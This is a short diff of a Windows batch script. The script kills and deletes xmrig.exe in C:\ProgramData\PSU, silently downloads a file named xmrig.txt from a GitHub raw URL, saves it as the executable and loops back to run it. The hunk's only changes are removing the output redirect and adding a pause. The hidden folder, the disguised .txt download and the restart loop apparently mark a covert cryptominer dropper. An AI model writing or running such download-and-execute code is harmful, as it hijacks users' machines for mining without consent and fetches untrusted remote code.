@@ -863,5 +863,6 @@ taskkill /IM xmrig.exe /F
 timeout 0 >> nul
 del "C:\ProgramData\PSU\xmrig.exe"
 timeout 0 >> nul
-curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe"
+timeout 3
 goto run
